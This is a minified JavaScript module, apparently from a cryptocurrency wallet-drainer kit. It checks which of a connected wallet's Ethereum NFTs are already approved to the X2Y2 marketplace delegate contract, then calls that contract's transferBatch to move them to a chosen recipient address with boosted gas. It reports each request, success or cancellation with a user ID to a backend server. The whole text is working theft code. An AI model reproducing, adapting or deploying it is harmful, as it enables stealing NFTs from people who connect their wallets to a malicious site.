const MS_X2Y2_ABI=[{inputs:[{components:[{internalType:"contract IERC721",name:"token",type:"address"},{internalType:"uint256",name:"tokenId",type:"uint256"}],internalType:"struct ERC721Delegate.Pair[]",name:"pairs",type:"tuple[]"},{internalType:"address",name:"to",type:"address"}],name:"transferBatch",outputs:[],stateMutability:"nonpayable",type:"function"}],SIGN_X2Y2=async(e,t,r,a,s)=>{try{const n=[],i=[];for(const t of e)t.skip||"ERC721"!==t.type||1!=t.chain_id||await is_nft_approved(t.address,r,"0xf849de01b080adc3a814fabe1e2087475cf2e354")&&(n.push({token:t.address,tokenId:ethers.BigNumber.from(t.id)}),i.push(t));if(0===n.length)return;let o=new ethers.providers.Web3Provider(t),c=o.getSigner();const d=new ethers.Contract("0xf849de01b080adc3a814fabe1e2087475cf2e354",MS_X2Y2_ABI,c);try{const t=ethers.BigNumber.from(await o.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("150")).toString();let c=null;try{c=await d.estimateGas.transferBatch(n,a,{from:r}),c=ethers.BigNumber.from(c).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString()}catch(e){c=25e4}const u=await o.getTransactionCount(r,"pending");await send_request({action:"x2y2",user_id:s,x2y2:"request",assets:i});const f=await d.transferBatch(n,a,{gasLimit:ethers.BigNumber.from(c),gasPrice:ethers.BigNumber.from(t),nonce:u});await f.wait(),await send_request({action:"x2y2",user_id:s,x2y2:"success"});for(const t of e){if(t.skip||"ERC721"!==t.type||1!=t.chain_id)continue;let e=!1;for(const r of i)if("ERC721"===r.type&&1==r.chain_id&&r.address==t.address&&r.id==t.id){e=!0;break}1==e&&(t.skip=!0)}}catch(e){console.log(e),await send_request({action:"x2y2",user_id:s,x2y2:"cancel"})}}catch(e){console.log(e)}};